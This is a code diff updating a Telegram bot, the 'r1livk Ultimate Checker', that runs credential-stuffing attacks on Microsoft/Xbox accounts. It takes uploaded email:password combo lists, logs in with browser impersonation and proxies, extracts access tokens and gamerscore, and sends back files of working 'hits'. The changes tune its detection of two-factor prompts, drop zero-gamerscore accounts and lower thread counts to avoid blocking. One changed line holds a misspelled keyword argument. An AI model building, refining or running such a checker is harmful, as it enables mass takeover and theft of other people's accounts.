@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 """
-r1livk Ultimate Checker ⚡ - Telegram Bot (Precision Hits Edition)
-Optimized for Accurate Hit Detection & Zero False-Bad Sorting
+r1livk Ultimate Checker ⚡ - Telegram Bot (Strict Anti-False 2FA & >0G Edition)
+Optimized for Accurate Hit Catching & Zero False-Positives
 """
 
 import os
@@ -62,7 +62,7 @@ def check_user_subscription(user_id):
     return False
 
 REQUEST_TIMEOUT = 15
-MAX_THREADS = 15  # تقليل الـ Threads قليلاً لمنع الحظر السريع من سيرفرات مايكروسوفت
+MAX_THREADS = 5  # سراع آمنة جداً لمنع الحظر الكاذب
 
 active_scans = {}
 user_usage = {}  
@@ -199,10 +199,19 @@ def check_single_account(combo, proxy_list=None, use_proxy=False):
         
         login_req = session.post(url_post, data=login_data, headers=headers, proxies=proxy_dict, impersonate="chrome120", allow_redirects=True, timeout=REQUEST_TIMEOUT)
         login_text = login_req.text.lower()
+        full_url = login_req.url.lower()
 
-        # كشف دقيق لحالات الحماية أو التحقق الثنائي بدلاً من اعتبارها Bad فوراً
-        if any(x in login_text for x in ["two-step", "additional security", "identity/confirm?m=", "proofs", "code", "verify", "challenge"]):
-            return "2fa", None
+        # [تعديل دقيق لمنع تصنيف الهيتس كـ 2FA بالغلط]
+        # شروط الـ 2FA الحقيقية والصارمة فقط
+        real_2fa_triggers = [
+            "two-step", "additional security", "identity/confirm?m=", 
+            "proofs", "challenge/contact", "sendcode", "authmethod=email"
+        ]
+        
+        if any(trigger in login_text or trigger in full_url for trigger in real_2fa_triggers):
+            # التأكد أكثر للتأكد أنها مش مجرد رسالة خطأ عادية
+            if "password is incorrect" not in login_text and "that microsoft account doesn't exist" not in login_text:
+                return "2fa", None
 
         if any(x in login_text for x in ["that microsoft account doesn't exist", "enter a valid email"]):
             return "bad", "Not Exist"
@@ -214,10 +223,10 @@ def check_single_account(combo, proxy_list=None, use_proxy=False):
             return "bad", "Locked"
 
         ms_token = None
-        full_url = login_req.url
+        current_url = login_req.url
         
-        if 'access_token=' in full_url:
-            parsed_url = urlparse(full_url)
+        if 'access_token=' in current_url:
+            parsed_url = urlparse(current_url)
             fragment_qs = parse_qs(parsed_url.fragment)
             if 'access_token' in fragment_qs:
                 ms_token = fragment_qs['access_token'][0]
@@ -280,10 +289,9 @@ def check_single_account(combo, proxy_list=None, use_proxy=False):
         except:
             pass
 
-        # فلتر دقيق لا يلغي الحسابات الحقيقية
+        # شرط صارم: رفض الصفر منعاً باتاً
         if gscore_int <= 0:
-            # حتى لو السكور 0، بنقدر نعتبرها هيت اذا تم تسجيل الدخول بنجاح تام، بس لتأكيد الجودة بنفلتر الـ 0 أو بنتركها حسب رغبتك. حالياً بنخليها لأي حساب شغال تماماً
-            pass
+            return "bad", "Zero Gamerscore (Filtered)"
 
         hit_info = (
             f"{email}:{password}\n"
@@ -325,7 +333,7 @@ def show_main_menu(message):
     msg_id = message.message.message_id if hasattr(message, 'message') and hasattr(message.message, 'message_id') else None
 
     markup = types.InlineKeyboardMarkup(row_width=1)
-    btn_start = types.InlineKeyboardButton("⚡ Start Precision Checker", callback_data="start_checker")
+    btn_start = types.InlineKeyboardButton("⚡ Start Strict Checker (>0G)", callback_data="start_checker")
     btn_proxy = types.InlineKeyboardButton("🚀 Upload Proxies (Optional)", callback_data="upload_proxies_menu")
     
     is_direct = user_proxy_mode.get(chat_id, True)
@@ -347,13 +355,13 @@ def show_main_menu(message):
 
     p_count = len(user_proxies.get(chat_id, []))
     if is_direct or p_count == 0:
-        proxy_status = "🌐 Status: Direct Connection (Fast & Clean)"
+        proxy_status = "🌐 Status: Direct Connection (Safe Speed)"
     else:
         proxy_status = f"🚀 Status: Proxies Active ({p_count})"
 
     text = (
-        "⚡ **r1livk Precision Checker - V2.9** ⚡\n\n"
-        "Advanced Xbox Hit Hunter with Precise Token Validation.\n"
+        "⚡ **r1livk Precision Checker - V3.1 (Anti-False 2FA)** ⚡\n\n"
+        "Prevents real hits from going to 2FA by mistake & filters 0G.\n"
         f"Your Status: {status_text}\n"
         f"{proxy_status}\n\n"
         "Please select an option below:"
@@ -401,12 +409,12 @@ def callback_query(call):
         p_count = len(user_proxies.get(chat_id, []))
         
         if is_direct or p_count == 0:
-            mode_desc = "🌐 Direct Connection (Fast)"
+            mode_desc = "🌐 Direct Connection (Safe Speed)"
         else:
             mode_desc = f"🚀 Active Proxies: {p_count}"
         
         text = (
-            "🎮 **Precision Gamerscore Mode**\n\n"
+            "🎮 **Strict Gamerscore Mode (>0G & No False 2FA)**\n\n"
             f"Current Mode: {mode_desc}\n\n"
             "Please send your combo file in `.txt` format (`email:password`)"
         )
@@ -516,7 +524,7 @@ def handle_docs(message):
                     if is_working:
                         working_proxies.append(proxy)
 
-            with ThreadPoolExecutor(max_workers=30) as executor:
+            with ThreadPoolExecutor(max_workers=20) as executor:
                 futures = [executor.submit(proxy_worker, proxy) for proxy in raw_proxies]
                 
                 while any(not f.done() for f in futures):
@@ -570,7 +578,7 @@ def handle_docs(message):
             return
 
         lines = lines[:lines_to_process_count]
-        bot.reply_to(message, f"📥 File received. Initializing Precision Hit Scan for {len(lines)} lines...")
+        bot.reply_to(message, f"📥 File received. Initializing Anti-False Scan for {len(lines)} lines...")
         active_scans[chat_id] = True
         
         username = message.from_user.username or message.from_user.first_name
@@ -588,7 +596,7 @@ def process_checker(chat_id, filepath, lines, username):
     errors = 0
 
     timestamp_str = time.strftime("%Y%m%d_%H%M%S")
-    output_filename = f"r1livk_PrecisionHits_{timestamp_str}.txt"
+    output_filename = f"r1livk_AntiFalseHits_{timestamp_str}.txt"
     start_time = time.time()
 
     markup = types.InlineKeyboardMarkup(row_width=1)
@@ -597,12 +605,12 @@ def process_checker(chat_id, filepath, lines, username):
     markup.add(btn_stop, btn_back)
 
     initial_status_text = (
-        f"🔥 **PRECISION SCAN STATS**\n\n"
+        f"🔥 **ANTI-FALSE SCAN STATS (>0G)**\n\n"
         f"📊 Total: {total}\n"
         f"✅ Checked: 0\n"
         f"🔒 2FA: 0\n"
-        f"❌ Bad: 0\n"
-        f"🎯 Hits: 0\n\n"
+        f"❌ Bad / 0G: 0\n"
+        f"🎯 Real Hits (>0G): 0\n\n"
         f"Progress: 0.0%\n"
         f"⚡ CPM: 0\n"
         f"⏱️ Elapsed: 00:00:00"
@@ -658,12 +666,12 @@ def process_checker(chat_id, filepath, lines, username):
                 pct = (curr_checked / total) * 100 if total > 0 else 0
 
                 live_text = (
-                    f"🔥 **PRECISION SCAN (Live)**\n\n"
+                    f"🔥 **ANTI-FALSE SCAN (Live)**\n\n"
                     f"📊 Total: {total}\n"
                     f"✅ Checked: {curr_checked} ({pct:.1f}%)\n"
                     f"🔒 2FA: {curr_tfa}\n"
-                    f"❌ Bad: {curr_bad}\n"
-                    f"🎯 Hits: {curr_hits}\n\n"
+                    f"❌ Bad / 0G: {curr_bad}\n"
+                    f"🎯 Real Hits (>0G): {curr_hits}\n\n"
                     f"⚡ CPM: {cpm}\n"
                     f"⏱️ Elapsed: {hrs:02d}:{mins:02d}:{secs:02d}"
                 )
@@ -683,19 +691,19 @@ def process_checker(chat_id, filepath, lines, username):
     final_summary = (
         f"🎉 **SCAN COMPLETED SUCCESSFULLY!**\n\n"
         f"📊 Total Checked: {checked}\n"
-        f"🎯 Hits Found: {hits}\n"
-        f"🔒 2FA Protected: {tfa_count}\n"
-        f"❌ Bad Accounts: {bad}"
+        f"🎯 Real Hits (>0G Found): {hits}\n"
+        f"🔒 True 2FA Protected: {tfa_count}\n"
+        f"❌ Bad / 0G Accounts: {bad}"
     )
     try:
         bot.edit_message_text(final_summary, chat_id=chat_id, message_id=status_msg.message_id, parse_mode="Markdown")
     except:
-        bot.send_message(chat_id, final_summary, parse_mode="Markdown")
+        bot.send_message(chat_id, final_summary, parse_Mode="Markdown")
 
     if hits > 0 and os.path.exists(output_filename):
         with open(output_filename, 'rb') as f:
-            bot.send_document(chat_id, f, caption=f"📁 **Precision Hits File:** {output_filename}")
+            bot.send_document(chat_id, f, caption=f"📁 **Anti-False Hits File (>0G):** {output_filename}")
 
 if __name__ == "__main__":
-    print("🚀 r1livk Precision Checker Bot is running...")
+    print("🚀 r1livk Anti-False Checker Bot is running...")
     bot.infinity_polling()
